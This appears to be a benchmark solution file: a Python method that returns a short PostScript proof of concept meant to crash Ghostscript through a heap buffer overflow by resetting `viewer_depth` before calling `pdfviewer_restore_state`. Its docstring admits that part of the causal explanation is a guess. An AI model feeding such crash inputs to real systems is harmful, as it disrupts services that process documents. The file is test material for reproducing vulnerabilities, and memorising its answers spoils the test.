class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is in the PostScript procedure `pdfviewer_restore_state`,
        which is part of Ghostscript's standard library (`zpdfview.ps`).
        The procedure in the vulnerable version does not check if `viewer_depth`
        is at least 1 before attempting to restore the viewer state.

        A simple call to `pdfviewer_restore_state` with the initial `viewer_depth`
        of 0 would result in a clean `rangecheck` error, as it tries to pop
        from an empty `viewer_stack`. This does not cause a crash.

        To trigger the heap buffer overflow, we need to bypass this clean error
        and proceed with an inconsistent state. This can be achieved by:
        1. Calling `pdfviewer_save_state`. This populates `viewer_stack` with
           state information and increments `viewer_depth` to 1.
        2. Manually resetting `viewer_depth` back to 0 within the `pdfview_dict`.
        3. Calling `pdfviewer_restore_state`. Now, the procedure executes
           with `viewer_depth` as 0 but with a non-empty `viewer_stack`.

        This sequence bypasses the `rangecheck` and enters the vulnerable part
        of the code. Inside `pdfviewer_restore_state`, `viewer_depth` is
        decremented to -1. This negative value is likely used later by a
        C-level operator in a way that causes a memory-safety error, leading
        to the observed heap-buffer-overflow.
        """
        
        # This PostScript code implements the logic described above.
        poc = b"""%!PS
pdfviewer_save_state
pdfview_dict begin
/viewer_depth 0 def
end
pdfviewer_restore_state
"""
        return poc